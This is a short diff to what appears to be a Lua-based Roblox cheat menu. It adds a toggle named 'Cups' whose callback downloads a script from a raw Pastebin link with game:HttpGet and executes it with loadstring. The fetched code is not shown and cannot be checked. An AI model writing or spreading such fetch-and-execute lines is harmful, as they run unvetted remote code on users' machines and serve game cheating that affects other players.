@@ -203,6 +203,13 @@ local Section2 = Tab2:Section({
    Text = "Double Down" ,
     Side = "Right"
 })
+Section2:Toggle({
+   Text = "Cups",
+   Callback = function(bool)
+  loadstring(game:HttpGet("https://pastebin.com/raw/EvCGgVTq"))()
+       warn(bool)
+   end
+})
 Section2:Button({
    Text = "Block Drop",
    Callback = function()
